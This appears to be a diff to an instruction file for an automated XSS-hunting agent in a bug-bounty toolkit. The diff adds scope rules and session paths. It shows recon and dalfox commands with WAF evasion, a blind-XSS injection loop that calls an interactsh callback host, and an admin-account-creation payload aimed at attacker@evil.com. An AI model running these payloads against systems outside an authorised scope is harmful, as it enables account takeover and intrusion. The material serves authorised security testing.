@@ -2,6 +2,8 @@
 
 **Mandate:** Find only HIGH/CRITICAL impact XSS. Skip reflected XSS with no session access. Focus on: stored XSS in admin panels, ATO-enabling XSS, CSP bypasses, DOM-clobbering chains.
 
+> **Scope & rules of engagement:** Before any request, confirm each target URL/host is within the program scope recorded in the session's target config (`kimi-data/Sessions/{slug}/`). Out-of-scope assets discovered during testing (e.g. via recon or redirects) must be excluded. Do not run DoS-class tests unless the program policy explicitly allows them.
+
 ---
 
 ## Application Context (READ BEFORE TESTING)
@@ -9,7 +11,8 @@
 Before writing a single payload, answer these questions from the AppProfile:
 
 ```bash
-cat /tmp/app-profile.json | jq '{
+# $SESSION_DIR = kimi-data/Sessions/{slug}/ (the current hunt session dir)
+cat $SESSION_DIR/app-profile.json | jq '{
   app_narrative: .app_narrative,
   xss_relevant_flows: [.high_value_flows[] | select(.agents[] == "XSSAgent")],
   crown_jewels: .crown_jewels,
@@ -34,13 +37,15 @@ cat /tmp/app-profile.json | jq '{
 ### 1. Injection Point Discovery
 ```bash
 # Find all reflection points
-cat /tmp/bb-urls.txt | gf xss | tee /tmp/xss-candidates.txt
+# produced by: gau $TARGET | waymore -i $TARGET -mode U ... > $SESSION_DIR/recon/urls.txt
+cat $SESSION_DIR/recon/urls.txt | gf xss | tee $SESSION_DIR/recon/xss-candidates.txt
 
-# DOM sink analysis (via Playwright)
-playwright xss-scan --target $TARGET --dom-analysis --output /tmp/dom-sinks.json
+# DOM sink analysis (via the repo's Playwright harness)
+bun kimi/Tools/playwright-harness.ts --target $TARGET --test-xss --output $SESSION_DIR/findings/playwright-xss.json
 
-# Template injection overlap check (Twig/Jinja/Handlebars)
-echo '{{7*7}}' | test_all_params $TARGET
+# Parameter discovery, then reflection/template-injection overlap check (e.g. {{7*7}})
+arjun -u "$TARGET" --get | tee $SESSION_DIR/recon/params.txt
+cat $SESSION_DIR/recon/params.txt | dalfox pipe --format json --output $SESSION_DIR/findings/dalfox-reflection.json
 ```
 
 ### 2. Payload Strategy by Context
@@ -122,9 +127,18 @@ fetch('/admin/users/create', {method:'POST', body:'{"email":"attacker@evil.com",
 ```
 
 ```bash
-# Use interactsh for OOB callback
-COLLAB=$(interactsh-client -n 1 | head -1)
-echo "<script src=https://$COLLAB></script>" | test_all_params $TARGET
+# Use interactsh for OOB callbacks.
+# `--server` SELECTS the interactsh server (default: public https://oast.site,
+# or a self-hosted instance); the client then PRINTS a unique callback domain
+# (e.g. abc123.oast.site) — embed THAT domain in your payloads.
+interactsh-client --server https://oast.site   # optional; default public server works too
+# -> note the printed callback domain, e.g. COLLAB=abc123.oast.site
+COLLAB="abc123.oast.site"
+# Inject it into discovered parameters, then poll the running client for DNS/HTTP hits
+arjun -u "$TARGET" --get | while read -r P; do
+  curl -sk "${P}\"><script src=https://$COLLAB/x></script>" -o /dev/null
+done
+# Any interaction shown by the client confirms blind XSS execution.
 ```
 
 ### 6. Dalfox Automated Scanning
@@ -133,14 +147,14 @@ dalfox url "https://$TARGET/search?q=FUZZ" \
   -b "https://YOUR-INTERACTSH.interact.sh" \
   --skip-mining-dom \
   --format json \
-  --output /tmp/dalfox-findings.json \
+  --output $SESSION_DIR/findings/dalfox-findings.json \
   --header "Cookie: $SESSION_COOKIE" \
   --waf-evasion
 
 # Pipeline mode for bulk scanning
-cat /tmp/xss-candidates.txt | dalfox pipe \
+cat $SESSION_DIR/recon/xss-candidates.txt | dalfox pipe \
   -b "https://YOUR-INTERACTSH.interact.sh" \
-  --output /tmp/dalfox-bulk.json
+  --output $SESSION_DIR/findings/dalfox-bulk.json
 ```
 
 ## Severity Classification
@@ -155,6 +169,9 @@ cat /tmp/xss-candidates.txt | dalfox pipe \
 | XSS in sandbox/isolated iframe | 4.0 | NO — DROP |
 
 ## Output Format
+
+All confirmed findings are written to `$SESSION_DIR/findings/xss-findings.json` as a single object of shape `{"target": ..., "generated_at": ..., "findings": [...]}`, where each finding follows:
+
 ```json
 {
   "type": "XSS",
